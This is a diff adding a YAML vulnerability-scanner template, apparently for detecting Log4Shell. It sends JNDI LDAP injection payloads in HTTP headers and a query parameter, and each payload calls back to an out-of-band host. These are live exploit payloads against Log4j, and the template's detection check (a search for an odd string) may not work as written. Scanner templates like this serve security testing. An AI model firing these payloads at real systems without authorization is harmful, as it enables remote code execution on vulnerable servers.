@@ -1,0 +1,30 @@
+id: RCE-jndi
+info:
+  name: rce-jndi
+  risk: ciritical
+
+params:
+  - dest: '{{.oob}}'
+  
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+       {{.URL}}
+    headers:
+       - X-Api-Version: "${jndi:ldap://{{.Domain}}.xapi.{{.dest}}/rce}"
+       - User-Agent: "${jndi:ldap://{{.Domain}}.useragent.{{.dest}}/rce}"
+    detections:
+      - >-
+         StringSearch("response", "aykalam")
+
+  - method: GET
+    redirect: false
+    url: >-
+       {{.URL}}?test=${jndi:ldap://{{.Domain}}.parameter.{{.dest}}/rce
+    headers:
+       - User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (${jndi:ldap://{{.Domain}}.useragent.{{.dest}}/rce}) Chrome/96.0.4664.45 Safari/537.36
+
+    detections:
+      - >-
+         StringSearch("response", "aykalam")   
